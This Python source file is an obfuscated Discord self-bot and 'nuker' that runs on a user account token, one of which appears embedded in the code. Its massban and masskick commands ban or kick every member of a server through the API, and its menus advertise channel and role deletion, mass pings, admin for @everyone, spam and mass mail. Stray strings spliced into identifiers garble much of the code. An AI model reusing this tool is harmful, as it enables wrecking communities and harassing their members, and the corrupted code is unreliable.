from urllib import parse #line:2
import re ,time
from colorama import Fore ,Style #line:4
import io ,smtplib ,ssl #line:5
from discord .ext import commands ,tasks #line:6
import random #line:7
from discord import Permissions #line:8
from discord import Guild ,Member ,Embed #line:9
import random ,requests ,os ,sys ,threading ,datetime ,json ,asyncio ,discord ,aiohttp ,urllib .parse ,urllib .request ,time #line:10
from itertools import cycle #line:11
from urllib import parse ,request #line:12
from pypresence import Presence #line:13
from discord import Webhook ,AsyncWebhookAdapter #line:14
from discord .ext import commands #line:15
from webserver import keep_alive #line:16
import os #line:18
os .system ('cls & mode 85,20 & title [R SELFBOTD SELF BOT] - discord.gg/rdop')#line:20
os .system ('cls')#line:21
prefix =('>')#line:22
token = os.environ.get('OTI5MzAxMTMwMjU1Njg3NzYw.YdlVQQ.-oHiAnRIL5vld_Xheb86bWTVVoA')#line:23  
password = ('')
def check_token ():#line:28
    if requests .get ('https://discord.com/api/v8/users/@me',headers ={'Authorization':f"{token}"}).status_code ==200 :#line:29
        return 'user'#line:30
    else :#line:31
        return 'bot'#line:32
token_type =check_token ()#line:35
intents =discord .Intents .all ()#line:36
intents .members =True #line:37
if token_type =='user':#line:38
    headers ={'Authorization':f"{token}"}#line:39
    client =commands .Bot (command_prefix=prefix,case_insensitive =False ,self_bot =True ,intents =intents )#line:40
else :#line:41
    if token_type =='bot':#line:42
        headers ={'Authorization':f"Bot {token}"}#line:43
        client =commands .Bot (command_prefix =prefix,case_insensitive =False ,intents =intents )#line:44
os .system ('cls')#line:45
def check_token ():#line:47
    if requests .get ('https://discord.com/api/v8/users/@me',headers ={'Authorization':f"{token}"}).status_code ==200 :#line:48
        return 'user'#line:49
client =commands .Bot (command_prefix =prefix ,case_insensitive =True ,self_bot =True )#line:52
client .remove_command (name ='help')#line:53
os .system ('cls'if os .name =='nt'else 'clear')#line:54
os .system ('cls'if os .name =='nt'else 'clear')#line:55
token_type =check_token ()#line:56
intents =discord .Intents .all ()#line:57
intents .members =True #line:58
os .system (f"cls & mode 85,20  SELFBOT& title [RD SELF BOT OP] - Connected: {client.user}")#line:59
if token_type =='user':#line:60
    headers ={'Authorization':f"{token}"}#line:61
    client =commands .Bot (command_prefix ='>',case_insensitive =False ,self_bot =True ,intents =intents )#line:62
client .remove_command ('help')#line:63
@client .event #line:65
async def on_ready ():#line:66
    await client .change_presence (activity =discord .Streaming (name ='SCAVEN ',url ='http://www.twitch.tv/DiosisOp'))#line:67
print ('YOUR ACCOUNT IS ALIVE WITH MOST OP SELF BOT \n CREATED BY DIOSIS Op \n JOIN discord.gg/rdop')#line:70
@client .command ()#line:72
async def massban (OOO0OOO00OO0OOOO0 ,OOO00OOOO000O0OOO ):#line:73
    OOO00OOOO000O0OOO =OOO00OOOO000O0OOO #line:74
    await client .wait_until_ready ()#line:75
    OOOO00O00OO000000 =client .get_guild (int (OOO00OOOO000O0OOO ))#line:76
    O0O0OO0O0O0000OOO =await OOOO00O00OO000000 .chunk ()#line:77
    try :#line:78
        os .remove ('members.txt')#line:79
    except :#line:80
        pass #line:81
    OO0000OOOO0O0O0OO =0 #line:83
    with open ('members.txt','a')as (O00OO0OO0O0OOOOO0 ):#line:84
        for OOO00O000OO00O000 in O0O0OO0O0O0000OOO :#line:85
            O00OO0OO0O0OOOOO0 .write (str (OOO00O000OO00O000 .id )+'\n')#line:86
            OO0000OOOO0O0O0OO +=1 #line:87
        await OOO0OOO00OO0OOOO0 .send ('STARTING BANING ALL PEOPLES IN THIS DISCORD SERVER')#line:89
        O00OO0OO0O0OOOOO0 .close ()#line:90
    OOO00OOOO000O0OOO =OOO00OOOO000O0OOO #line:91
    print ()#line:92
    O0O0OO0O0O0000OOO =open ('members.txt')#line:93
    for OOO00O000OO00O000 in O0O0OO0O0O0000OOO :#line:94
        while True :#line:95
            OOOOO0OO00O0000OO =requests .put (f"https://discord.com/api/v8/guilds/{OOO00OOOO000O0OOO}/bans/{OOO00O000OO00O000}",headers =headers )#line:96
            if 'retry_after'in OOOOO0OO00O0000OO .text :#line:97
                time .sleep (OOOOO0OO00O0000OO .json ()['retry_after'])#line:98
            else :#line:99
                if OOOOO0OO00O0000OO .status_code ==200 or OOOOO0OO00O0000OO .status_code ==201 or OOOOO0OO00O0000OO .status_code ==204 :#line:100
                    print (f"Banned{OOO00O000OO00O000.strip()}")#line:101
                    break #line:102
                else :#line:103
                    break #line:104
    O0O0OO0O0O0000OOO .close ()#line:106
@client .command ()#line:109
async def masskick (OO0OOOO0OOO00O000 ,O000O00O0O0OOOO0O ):#line:110
    O000O00O0O0OOOO0O =O000O00O0O0OOOO0O #line:111
    await client .wait_until_ready ()#line:112
    O0OO0O000OO00O0OO =client .get_guild (int (O000O00O0O0OOOO0O ))#line:113
    OOO000O0O0OOO0OOO =await O0OO0O000OO00O0OO .chunk ()#line:114
    try :#line:115
        os .remove ('members.txt')#line:116
    except :#line:117
        pass #line:118
    OO000O0O000OOO00O =0 #line:120
    with open ('members.txt','a')as (O0OOO000OO00O000O ):#line:121
        for OO0O0O000OO00OO00 in OOO000O0O0OOO0OOO :#line:122
            O0OOO000OO00O000O .write (str (OO0O0O000OO00OO00 .id )+'\n')#line:123
            OO000O0O000OOO00O +=1 #line:124
        await OO0OOOO0OOO00O000 .send ('STARTING KICKING ALL PEOPLES IN THIS DISCORD SERVER')#line:126
        O0OOO000OO00O000O .close ()#line:127
    O000O00O0O0OOOO0O =O000O00O0O0OOOO0O #line:128
    print ()#line:129
    OOO000O0O0OOO0OOO =open ('members.txt')#line:130
    for OO0O0O000OO00OO00 in OOO000O0O0OOO0OOO :#line:131
        while True :#line:132
            OO00O0O00OOOOOOO0 =requests .delete (f"https://discord.com/api/v8/guilds/{O000O00O0O0OOOO0O}/members/{OO0O0O000OO00OO00}",headers =headers )#line:133
            if 'retry_after'in OO00O0O00OOOOOOO0 .text :#line:134
                time .sleep (OO00O0O00OOOOOOO0 .json ()['retry_after'])#line:135
            else :#line:136
                if OO00O0O00OOOOOOO0 .status_code ==200 or OO00O0O00OOOOOOO0 .status_code ==201 or OO00O0O00OOOOOOO0 .status_code ==204 :#line:137
                    print (f"Kicked {OO0O0O000OO00OO00.strip()}")#line:138
                    break #line:139
                else :#line:140
                    break #line:141
    OOO000O0O0OOO0OOO .close ()#line:143
@client .command ()#line:146
async def general (O00O000OO000OO000 ):#line:147
    await O00O000OO000OO000 .message .delete ()#line:148
    O00O0O00O0O000000 =discord .Embed (color =16320006 ,timestamp =(O00O000OO000OO000 .message .created_at ))#line:149
    O00O0O00O0O000000 . SELFBOTset_author (name ='𝐑𝐃 𝐒𝐄𝐋𝐅 𝐁𝐎𝐓')#line:150
    O00O0O00O0O000000 .set_thumbnail (url =(client .user .avatar_url ))#line:151
    O00O0O00O0O000000 .set_image (url ='https://media.discordapp.net/attachments/859461160621047868/860061580653363231/download_7.gif')#line:152
    O00O0O00O0O000000 .add_field (name =' `>𝐏𝐑𝐄𝐅𝐈𝐗`',value ='ℂℍ𝔸ℕ𝔾𝔼 𝕋ℍ𝔼 𝕊𝕃𝔼𝔽 𝔹𝕆𝕋 ℙℝ𝔼𝔽𝕀𝕏',inline =False )#line:153
    O00O0O00O0O000000 .add_field (name =' `>𝐀𝐕`',value ='𝕊ℍ𝕆𝕎 𝕋ℍ𝔼 𝕌𝕊𝔼ℝ ℙ𝔽ℙ',inline =False )#line:154
    O00O0O00O0O000000 .add_field (name =' `>𝐋𝐄𝐀𝐕𝐄 <𝐒𝐄𝐑𝐕𝐄𝐑-𝐈𝐃>`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕄𝕆𝔻𝔼ℝ𝔸𝕋𝕀𝕆ℕ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:155
    O00O0O00O0O000000 .add_field (name =' `>𝐄𝐍𝐃`',value ='𝕋𝕌ℝℕ 𝕆𝔽𝔽 𝕋ℍ𝔼 𝕊𝔼𝕃𝔽 𝔹𝕆𝕋',inline =False )#line:156
    O00O0O00O0O000000 .add_field (name =' `>𝐂𝐎𝐏𝐘`',value ='𝕄𝔸𝕂𝔼 𝔸 ℂ𝕆ℙ𝕐 𝕆𝔽 𝕋ℍ𝔸𝕋 𝕊𝔼ℝ𝕍𝔼ℝ',inline =False )#line:157
    O00O0O00O0O000000 .add_field (name =" '>𝐏𝐎𝐋𝐋`",value ='ℂℝ𝔼𝔸𝕋𝔼 𝔸 𝕍𝕆𝕋𝕀ℕ𝔾 ℙ𝕆𝕃𝕃',inline =False )#line:158
    O00O0O00O0O0yzenOP00000 .set_footer (text ='Created By CherryOP')#line:159
    await O00O000OO000OO000 .send (embed =O00O0O00O0O000000 )#line:160
@client .command ()#line:163
async def text (OOOO000O0OO00OOO0 ):#line:164
    await OOOO000O0OO00OOO0 .message .delete ()#line:165
    OO0000O0O0OOOOOO0 =discord .Embed (color =16320006 ,timestamp =(OOOO000O0OO00OOO0 .message .created_at ))#line:166
    OO SELFBOT0000O0O0OOOOOO0 .set_author (name ='I')#line:167
    OO0000O0O0OOOOOO0 .set_thumbnail (url =(client .user .avatar_url ))#line:168
    OO0000O0O0OOOOOO0 .set_image (url ='https://media.discordapp.net/attachments/859461160621047868/860053519293743114/download_3.gif')#line:169
    OO0000O0O0OOOOOO0 .add_field (name =' `>𝐒𝐏𝐀𝐌`',value ='𝕊ℙ𝔸𝕄 𝔸 𝕄𝔼𝕊𝕊𝔸𝔾𝔼',inline =False )#line:170
    OO0000O0O0OOOOOO0 .add_field (name =' `>𝐄𝐌𝐁𝐄𝐃`',value ='𝕊𝔼ℕ𝔻 𝔸 𝔼𝕄𝔹𝔼𝔻 𝕄𝔼𝕊𝕊𝔸𝔾𝔼',inline =False )#line:171
    OO0000O0O0OOOOOO0 .add_field (name =' `>𝐁𝐎𝐋𝐃`',value ='𝕊𝔼ℕ𝔻 𝔸 𝔹𝕆𝕃𝔻 𝕄𝔼𝕊𝕊𝔸𝔾𝔼',inline =False )#line:172
    OO0000O0O0OOOOOO0 .add_field (name =' `>𝐂𝐎𝐃𝐄`',value ='𝕊𝔼ℕ𝔻 𝔸 𝕄𝔼𝕊𝕊𝔸𝔾𝔼 𝕀ℕ ℂ𝕆𝔻𝔼 𝔽𝕆ℝ𝕄𝔸𝕋𝔼',inline =False )#line:173
    OO0000O0O0OOOOOO0 .add_field (name =' `>𝐂𝐑𝐀𝐒𝐇`',value ='ℂℝ𝔸𝕊ℍ 𝔸 𝕊𝔼ℝ𝕍𝔼ℝ 𝕆ℝ 𝕌𝕊𝔼ℝ 𝔻𝕄',inline =False )#line:174
    OO0000yzenOPO0O0OOOOOO0 .set_footer (text ='Created By CherryOP')#line:175
    await OOOO000O0OO00OOO0 .send (embed =OO0000O0O0OOOOOO0 )#line:176
@client .command ()#line:179
async def info (O0O0O0OOOO000O0OO ):#line:180
    await O0O0O0OOOO000O0OO .message .delete ()#line:181
    O0OO0O00OOOO000O0 =discord .Embed (color =16320006 ,timestamp =(O0O0O0OOOO000O0OO .message .created_at ))#line:182
    O0OO0O00OOOO000O0 .se SELFBOTt_author (name ='𝐑𝐃 𝐒𝐄𝐋𝐅 𝐁𝐎𝐓')#line:183
    O0OO0O00OOOO000O0 .set_thumbnail (url =(client .user .avatar_url ))#line:184
    O0OO0O00OOOO000O0 .set_image (url ='https://media.discordapp.net/attachments/859461160621047868/860037030514786304/download_4.gif')#line:185
    O0OO0O00OOOO000O0 .add_field (name =' `>𝐒𝐄𝐑𝐕𝐄𝐑𝐈𝐍𝐅𝐎`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕋𝔼𝕏𝕋 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:186
    O0OO0O00OOOO000O0 .add_field (name =' `>𝐔𝐒𝐄𝐑𝐈𝐍𝐅𝐎`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕀ℕ𝔽𝕆 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:187
    O0OO0O00OOOO000O0 .add_field (name =' `>𝐁𝐀𝐍𝐍𝐄𝐑`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕄𝕆𝔻𝔼ℝ𝔸𝕋𝕀𝕆ℕ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:188
    O0OO0O00OOOO000O0 .add_field (name =' `>𝐋𝐎𝐆𝐎`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 ℕ𝕌𝕂𝔼 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:189
    O0OO0O00OOOO000O0 .add_field (name =' `>𝐓𝐎𝐊𝐄𝐍𝐈𝐍𝐅𝐎`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕄𝕀𝕊ℂ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:190
    O0OO0O00OOOO000O0 .add_field (name =' >𝐈𝐏𝐈𝐍𝐅𝐎`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 ℕ𝕊𝔽𝕎 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =FayzenOPlse )#line:191
    O0OO0O00OOOO000O0 .set_footer (text ='Created By CherryOP')#line:192
    await O0O0O0OOOO000O0OO .send (embed =O0OO0O00OOOO000O0 )#line:193
@client .command ()#line:197
async def misc (OOOO000O0O00O0OOO ):#line:198
    await OOOO000O0O00O0OOO .message .delete ()#line:199
    O00OOO0O00O0O0OO0 =discord .Embed (color =16320006 ,timestamp =(OOOO000O0O00O0OOO .message .created_at ))#line:200
    O00 SELFBOTOOO0O00O0O0OO0 .set_author (name ='𝐑𝐃 𝐒𝐄𝐋𝐅 𝐁𝐎𝐓')#line:201
    O00OOO0O00O0O0OO0 .set_thumbnail (url =(client .user .avatar_url ))#line:202
    O00OOO0O00O0O0OO0 .set_image (url ='https://media.discordapp.net/attachments/859461160621047868/860076323921330176/download_5.gif')#line:203
    O00OOO0O00O0O0OO0 .add_field (name =' `>𝐒𝐓𝐑𝐄𝐀𝐌`',value ='𝕊𝕋𝔸ℝ𝕋 𝔸 𝕊𝕋ℝ𝔼𝔸𝕄𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',inline =False )#line:204
    O00OOO0O00O0O0OO0 .add_field (name =' `>𝐏𝐋𝐀𝐘`',value ='𝕊𝕋𝔸ℝ𝕋 𝔸 ℙ𝕃𝔸𝕐𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',inline =False )#line:205
    O00OOO0O00O0O0OO0 .add_field (name =' `>𝐋𝐈𝐒𝐓𝐄𝐍`',value ='𝕊𝕋𝔸ℝ𝕋 𝔸 𝕃𝕀𝕊𝕋𝔼ℕ𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',inline =False )#line:206
    O00OOO0O00O0O0OO0 .add_field (name =' `>𝐖𝐀𝐓𝐂𝐇`',value ='𝕊𝕋𝔸ℝ𝕋 𝔸 𝕎𝔸𝕋ℂℍ𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',inline =False )#line:207
    O00OOO0O00O0O0OO0 .add_field (name =' `>𝐑𝐄𝐌𝐎𝐕𝐄𝐒𝐓𝐀𝐓𝐔𝐒`',value ='ℝ𝔼𝕄𝕆𝕍𝔼 𝔸 yzenOP 𝕊𝕋𝔸𝕋𝕌𝕊',inline =False )#line:208
    O00OOO0O00O0O0OO0 .set_footer (text ='Created By CherryOP')#line:209
    await OOOO000O0O00O0OOO .send (embed =O00OOO0O00O0O0OO0 )#line:210
@client .command ()#line:213
async def help (OOO0O0O00000O00O0 ):#line:214
    await OOO0O0O00000O00O0 .message .delete ()#line:215
    O00O0OO00OO0O0O0O =discord .Embed (color =16320006 ,timestamp =(OOO0O0O00000O00O0 .message .created_at ) SELFBOT)#line:216
    O00O0OO00OO0O0O0O .set_author (name ='𝐑𝐃 𝐒𝐄𝐋𝐅 𝐁𝐎𝐓')#line:217
    O00O0OO00OO0O0O0O .set_thumbnail (url =(client .user .avatar_url ))#line:218
    O00O0OO00OO0O0O0O .set_image (url ='https://media.discordapp.net/attachments/859461160621047868/859997674437345310/download.gif')#line:219
    O00O0OO00OO0O0O0O .add_field (name =' `>𝐆𝐄𝐍𝐄𝐑𝐀𝐋`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝔾𝔼ℕ𝔼ℝ𝔸𝕃 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:220
    O00O0OO00OO0O0O0O .add_field (name =' `>𝐓𝐄𝐗𝐓`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕋𝔼𝕏𝕋 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:221
    O00O0OO00OO0O0O0O .add_field (name =' `>𝐈𝐍𝐅𝐎`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕀ℕ𝔽𝕆 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:222
    O00O0OO00OO0O0O0O .add_field (name =' `>𝐌𝐎𝐃𝐄𝐑𝐀𝐓𝐈𝐎𝐍`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕄𝕆𝔻𝔼ℝ𝔸𝕋𝕀𝕆ℕ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:223
    O00O0OO00OO0O0O0O .add_field (name =' `>𝐍𝐔𝐊𝐄`',value ='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 ℕ𝕌𝕂𝔼 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:224
    O00O0OO00OO0O0O0O .add_field (name =' `>𝐌𝐈𝐒𝐂`',value =yzenOP'𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕄𝕀𝕊ℂ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',inline =False )#line:225
    O00O0OO00OO0O0O0O .set_footer (text ='Created By CherryOP')#line:226
    await OOO0O0O00000O00O0 .send (embed =O00O0OO00OO0O0O0O )#line:227
@client .command ()#line:230
async def nuke (O00OO00O0OOO0OOO0 ):#line:231
    await O00OO00O0OOO0OOO0 .message .delete ()#line:232
    O000OO0O0OOOO0O0O =discord .Embed (color =16320006 ,timestamp =(O00OO00O0OOO0OOO0 .mes SELFBOTsage .created_at ))#line:233
    O000OO0O0OOOO0O0O .set_author (name ='𝐑𝐃 𝐒𝐄𝐋𝐅 𝐁𝐎𝐓')#line:234
    O000OO0O0OOOO0O0O .set_thumbnail (url =(client .user .avatar_url ))#line:235
    O000OO0O0OOOO0O0O .set_image (url ='https://media.discordapp.net/attachments/859461160621047868/860004927086919690/download_1.gif')#line:236
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐖𝐈𝐙𝐙`',value ='ℕ𝕌𝕂𝔼 𝔽𝕌𝕃𝕃 𝕊𝔼ℝ𝕍𝔼ℝ 𝔻𝔼𝕃𝔼𝕋𝔼 ℂℍ𝔸ℕℕ𝔼𝕃 ℝ𝕆𝕃𝔼 𝔸ℕ𝔻 𝔹𝔸ℕ 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼',inline =False )#line:237
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐌𝐀𝐒𝐒𝐁𝐀𝐍 <𝐆𝐔𝐈𝐋𝐃_𝐈𝐃>`',value ='𝔹𝔸ℕ 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼 𝕆ℕ 𝔸 𝕊𝔼ℝ𝕍𝔼ℝ',inline =False )#line:238
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐌𝐀𝐒𝐒𝐊𝐈𝐂𝐊 <𝐆𝐔𝐈𝐋𝐃_𝐈𝐃>`',value ='𝕂𝕀ℂ𝕂 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼 𝕆ℕ 𝔸 𝕊𝔼ℝ𝕍𝔼ℝ',inline =False )#line:239
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐑𝐑`',value ='ℝ𝔼ℕ𝔸𝕄𝔼 𝔸𝕃𝕃 ℝ𝕆𝕃𝔼𝕊',inline =False )#line:240
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐑𝐂`',value ='ℝ𝔼ℕ𝔸𝕄𝔼 𝔸𝕃𝕃 ℂℍ𝔸ℕℕ𝔼𝕃𝕊',inline =False )#line:241
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐑𝐒`',value ='ℝ𝔼ℕ𝔸𝕄𝔼 𝕊𝔼ℝ𝕍𝔼ℝ',inline =False )#line:242
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐏𝐈𝐍𝐆𝐒`',value ='𝕄𝔸𝕊𝕊 ℙ𝕀ℕ𝔾𝕊 𝟙𝕂+ ℙ𝕀ℕ𝔾 𝕀ℕ 𝟙𝟘 𝕊𝔼ℂ',inline =False )#line:243
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐒𝐓𝐎𝐏`',value ='𝕊𝕋𝕆ℙ 𝕄𝔸𝕊𝕊 @𝕖𝕧𝕖𝕣𝕪𝕠𝕟𝕖 ℙ𝕀ℕ𝔾',inline =False )#line:244
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐊𝐈𝐋𝐋𝐇𝐎𝐎𝐊`',value ='𝔻𝔼𝕃𝔼𝕋𝔼 𝔸 𝕎𝔼𝔹ℍ𝕆𝕆𝕂',inline =False )#line:245
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐀𝐃𝐌𝐈𝐍𝐀𝐋𝐋`',value ='𝔾𝕀𝕍𝔼 𝔸𝔻𝕄𝕀ℕ 𝕀ℕ @𝕖𝕧𝕖𝕣𝕪𝕠𝕟𝕖 ℝ𝕆𝕃𝔼',inline =False )#line:246
    O000OO0O0OOOO0O0O .add_field (name =' `>𝐌𝐀𝐒𝐒𝐌𝐀𝐈𝐋 <𝐫𝐞𝐜𝐞𝐢𝐯𝐞𝐫 𝐦𝐚𝐢𝐥>`',valueyzenOP ='𝕊𝔼ℕ𝔻 𝕋𝕆𝕆 𝕄𝔸ℕ𝕐 𝕄𝔸𝕀𝕃𝕊 𝕆ℕ ℝ𝔼ℂ𝔼𝕀𝕍𝔼ℝ 𝕄𝔸𝕀𝕃',inline =False )#line:247
    O000OO0O0OOOO0O0O .set_footer (text ='Created By CherryOP')#line:248
    await O00OO00O0OOO0OOO0 .send (embed =O000OO0O0OOOO0O0O )#line:249
@client .command ()#line:252
async def moderation (OOO00O00O000OOO0O ):#line:253
    await OOO00O00O000OOO0O .message .delete ()#line:254
    O0OOO00O00O0O00O0 =discord .Embed (color =16320006 ,timestamp =(OOO0 SELFBOT0O00O000OOO0O .message .created_at ))#line:255
    O0OOO00O00O0O00O0 .set_author (name ='𝐑𝐃 𝐒𝐄𝐋𝐅 𝐁𝐎𝐓')#line:256
    O0OOO00O00O0O00O0 .set_thumbnail (url =(client .user .avatar_url ))#line:257
    O0OOO00O00O0O00O0 .set_image (url ='https://media.discordapp.net/attachments/859461160621047868/860031953007542302/download_2.gif')#line:258
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐁𝐀𝐍`',value ='𝔹𝔸ℕ 𝔸 𝕌𝕊𝔼ℝ',inline =False )#line:259
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐊𝐈𝐂𝐊`',value ='𝕂𝕀ℂ𝕂 𝔸 𝕌𝕊𝔼ℝ',inline =False )#line:260
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐔𝐍𝐁𝐀𝐍`',value ='𝕌ℕ𝔹𝔸ℕ 𝔸 𝕌𝕊𝔼ℝ',inline =False )#line:261
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐋𝐎𝐂𝐊`',value ='𝕃𝕆ℂ𝕂 𝕋ℍ𝔼 ℂℍ𝔸ℕℕ𝔼𝕃𝕊',inline =False )#line:262
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐂𝐋𝐄𝐀𝐑`',value ='ℂ𝕃𝔼𝔸ℝ 𝕄𝔼𝕊𝕊𝔸𝔾𝔼𝕊',inline =False )#line:263
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐃𝐌𝐀𝐋𝐋`',value ='𝕄𝔸𝕊𝕊 𝔻𝕄 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼',inline =False )#line:264
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐌𝐔𝐓𝐄`',value ='𝕄𝕌𝕋𝔼 𝔸 𝕌𝕊𝔼ℝ',inline =False )#line:265
    O0OOO00O00O0O00O0 .add_field (name =' `>𝐔𝐍𝐌𝐔𝐓𝐄`',value ='𝕌ℕ𝕄𝕌𝕋𝔼 𝔸 𝕌𝕊𝔼ℝ',inline =False )#line:266
    O0OOO00O00O0O00O0yzenOP .add_field (name =' `>𝐌𝐂`',value ='ℂ𝕆𝕌ℕ𝕋 𝔸𝕃𝕃 𝕄𝔼𝕄𝔹𝔼ℝ𝕊 𝕀ℕ 𝕋ℍ𝔼 𝕊𝔼ℝ𝕍𝔼ℝ',inline =False )#line:267
    O0OOO00O00O0O00O0 .set_footer (text ='Created By CherryOP')#line:268
    await OOO00O00O000OOO0O .send (embed =O0OOO00O00O0O00O0 )#line:269
@client .command ()#line:272
async def prefix (O0O0O0O00O0O0O000 ,OO00O0OO00O0O0OOO ):#line:273
    client .command_prefix =str (OO00O0OO00O0O0OOO )#line:274
    await O0O0O0O00O0O0O000 .message .delete ()#line:275
    await O0O0O0O00O0O0O000 .send ('```YOUR PREFIX HAS BEEN CHANGED```')#line:276
@client .command (aliases =['mc'])#line:279
async def members (OOOOOO0O0OOOO00O0 ):#line:280
    OOO0OO000OOO0OO0O =OOOOOO0O0OOOO00O0 .guild .member_count #line:281
    OOOOO0O0OOO0O0000 =discord .Embed (title =f"MEMBERS IN {OOOOOO0O0OOOO00O0.guild.name}",description =OOO0OO000OOO0OO0O ,color =(discord .Color (16776960 )))#line:282
    await OOOOOO0O0OOOO00O0 .send (embed =embed )#line:283
@client .command ()#line:286
async def stop (O0OO0OOO00OOOO000 ):#line:287
    global spammingdawebhookeroos #line:288
    try :#line:289
        await O0OO0OOO00OOOO000 .message .delete ()#line:290
    except :#line:291
        pass #line:292
    spammingdawebhookeroos =False #line:294
@client .command ()#line:297
async def spam (O00OOO00O0O000OO0 ,OOOOOOOO0OO000000 :int ,*,message ):#line:298
    await O00OOO00O0O000OO0 .message .delete ()#line:299
    for _OO00OOOO00OO0OO00 in range (OOOOOOOO0OO000000 ):#line:300
        await O00OOO00O0O000OO0 .send (message )#line:301
@client .command ()#line:304
async def av (OO0OO0O00O000OO00 ,*,user :discord .Member =None ):#line:305
    await OO0OO0O00O000OO00 .message .delete ()#line:306
    OOO0O0O0OO0OOOOO0 ='gif'#line:307
    user =user or OO0OO0O00O000OO00 .author #line:308
    if user .is_avatar_animated ()!=True :#line:309
        OOO0O0O0OO0OOOOO0 ='png'#line:310
    O0OO0O0O0OOO00000 =user .avatar_url_as (format =(OOO0O0O0OO0OOOOO0 if OOO0O0O0OO0OOOOO0 !='gif'else None ))#line:311
    async with aiohttp .ClientSession ()as OO0O0O0000OOOO00O :#line:312
        async with OO0O0O0000OOOO00O .get (str (O0OO0O0O0OOO00000 ))as OO000O00O0OO0O000 :#line:313
            O00OOOO0OOO00OO00 =await OO000O00O0OO0O000 .read ()#line:314
    with io .BytesIO (O00OOOO0OOO00OO00 )as (O00OOO00OOO0OO000 ):#line:315
        await OO0OO0O00O000OO00 .send (file =(discord .File (O00OOO00OOO0OO000 ,f"Avatar.{OOO0O0O0OO0OOOOO0}")))#line:316
@client .command (aliases =['logout'])#line:319
async def end (OO00OOO0O0000OO00 ):#line:320
    await OO00OOO0O0000OO00 .message .delete ()#line:321
    await client .logout ()#line:322
@client .command (aliases =['copyserver'])#line:325
async def copy (O0OOOOOOO0O0O000O ):#line:326
    await O0OOOOOOO0O0O000O .message .delete ()#line:327
    await client .create_guild (f"backup-{O0OOOOOOO0O0O000O.guild.name}")#line:328
    await asyncio .sleep (4 )#line:329
    for O0000OOO00OOOO0O0 in client .guilds :#line:330
        if f"backup-{O0OOOOOOO0O0O000O.guild.name}"in O0000OOO00OOOO0O0 .name :#line:331
            for O0OO0O0OO000000OO in O0000OOO00OOOO0O0 .channels :#line:332
                await O0OO0O0OO000000OO .delete ()#line:333
            for O00OO0O000OOO0OO0 in O0OOOOOOO0O0O000O .guild .categories :#line:335
                O0OO0000OOOOOO000 =await O0000OOO00OOOO0O0 .create_category ((f"{O00OO0O000OOO0OO0.name}"))#line:336
                for OOO00O0OOOO00OO00 in O00OO0O000OOO0OO0 .channels :#line:337
                    if isinstance (OOO00O0OOOO00OO00 ,discord .VoiceChannel ):#line:338
                        await O0OO0000OOOOOO000 .create_voice_channel ((f"{OOO00O0OOOO00OO00}"))#line:339
                    if isinstance (OOO00O0OOOO00OO00 ,discord .TextChannel ):#line:340
                        await O0OO0000OOOOOO000 .create_text_channel ((f"{OOO00O0OOOO00OO00}"))#line:341
    try :#line:343
        await O0000OOO00OOOO0O0 .edit (icon =(O0OOOOOOO0O0O000O .guild .icon_url ))#line:344
    except :#line:345
        pass #line:346
@client .command (pass_context =True )#line:349
async def serverinfo (O000OOOOO00OO00OO ):#line:350
    O0OO000O000O00000 =discord .Embed (name =("{}'s info".format (O000OOOOO00OO00OO .message .server .name )),description ='Here is your server info',color =65280 )#line:351
    O0OO000O000O00000 .set_author (name ='Server Info')#line:352
    O0OO000O000O00000 .add_field (name ='Name',value =(O000OOOOO00OO00OO .message .server .name ),inline =True )#line:353
